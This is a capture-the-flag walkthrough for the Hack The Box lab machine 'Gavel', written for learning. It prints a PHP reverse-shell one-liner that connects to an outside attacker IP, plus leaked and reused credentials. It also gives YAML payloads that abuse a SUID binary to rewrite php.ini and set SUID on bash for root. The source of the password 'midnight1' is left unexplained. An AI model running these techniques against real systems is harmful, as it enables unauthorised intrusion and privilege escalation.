# Gavel HTB — Writeup

## Reconnaissance

### Nmap Scan

```bash
nmap -sC -sV gavel.htb
```

**Results:**

- **22/tcp** — OpenSSH 8.9p1 (Ubuntu)
- **80/tcp** — Apache 2.4.52 (Ubuntu)
- HTTP redirects to: `http://gavel.htb`
- OS detection suggests Linux (possible FortiGate false positives)

---

## Web Enumeration

The web application revealed configuration files containing database credentials.

### Credentials Found

```text
user = auctioneer
pass = gavel
db_pass = gavel
```

Trying these credentials on the system revealed a valid user.

---

## Initial Access

### Valid User Credentials

```text
auctioneer:midnight1
```

### Reverse Shell (Web)

```php
system('bash -c "bash -i >& /dev/tcp/10.10.16.184/4444 0>&1"');
```

Listener:

```bash
nc -lnvp 4444
```

Shell received as `www-data`.

---

## User Escalation

Switching to the `auctioneer` user:

```bash
su - auctioneer
Password: midnight1
```

### User Flag

```bash
cat ~/user.txt
```

```
172fce8286f0f1e4e6b45d12b7c9afbf
```

Upgrade shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

## Privilege Escalation

A SUID binary was identified:

```bash
which gavel-util
ls -la /usr/local/bin/gavel-util
```

### Exploitation Strategy

The binary accepts YAML input and executes PHP rules.

---

### Step 1 — Prepare Workspace

```bash
cd /tmp
mkdir pwn_exploit
cd pwn_exploit
```

---

### Step 2 — Overwrite PHP Configuration

```yaml
name: IniOverwrite
description: Removing restrictions
image: "data:image/png;base64,AA=="
price: 1337
rule_msg: "Config Pwned"
rule: |
  file_put_contents('/opt/gavel/.config/php/php.ini',
  "engine=On\ndisplay_errors=On\nopen_basedir=/\ndisable_functions=\n");
  return false;
```

Submit:

```bash
/usr/local/bin/gavel-util submit ini_overwrite.yaml
```

---

### Step 3 — Set SUID on Bash

```yaml
name: RootSuid
description: Getting Root
image: "data:image/png;base64,AA=="
price: 1337
rule_msg: "Shell Pwned"
rule: |
  system("chmod u+s /bin/bash");
  return false;
```

Submit:

```bash
/usr/local/bin/gavel-util submit root_suid.yaml
sleep 2
```

---

### Root Shell

```bash
/bin/bash -p
```

You are now **root**.

---

## Conclusion

The system was compromised through:

1. Credential disclosure in configuration files  
2. Weak password reuse  
3. Insecure SUID binary executing user-controlled YAML  
4. PHP configuration abuse leading to full privilege escalation  

---

**Box Pwned 🏴‍☠️**
